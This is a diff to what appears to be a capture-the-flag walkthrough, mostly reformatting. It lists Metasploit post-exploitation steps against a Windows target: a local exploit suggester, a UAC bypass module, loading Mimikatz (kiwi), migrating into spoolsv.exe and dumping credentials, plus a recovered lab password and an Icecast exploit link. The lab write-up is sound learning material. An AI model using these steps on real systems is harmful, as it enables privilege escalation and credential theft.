@@ -56,19 +56,22 @@ Host script results:
 
 ``` run post/mutli/recon/local_exploit_suggestor``` 
 
-## We found - ``` exploit/windows/local/bypassuac_eventvwr```
+## We found - 
+``` exploit/windows/local/bypassuac_eventvwr```
 
-# Loading mimikartz - ```load kiwi```
+# Loading mimikartz - 
+```load kiwi```
 
 ## Migrate into - spoolsv.exe
 ```migrate spoolsv.exe```
 
 
-# Passwords found using Kiwi - ```creds_all```
-
+# Passwords found using Kiwi 
+```creds_all```
 ```Password -DARK - Password01!```
 
-# Exploit_db Script fpr Icecast 
+# Exploit_db Script for Icecast 
 
-## link - ``` https://exploit-db.com/exploits/568```
+## link - 
+**https://exploit-db.com/exploits/568**
 
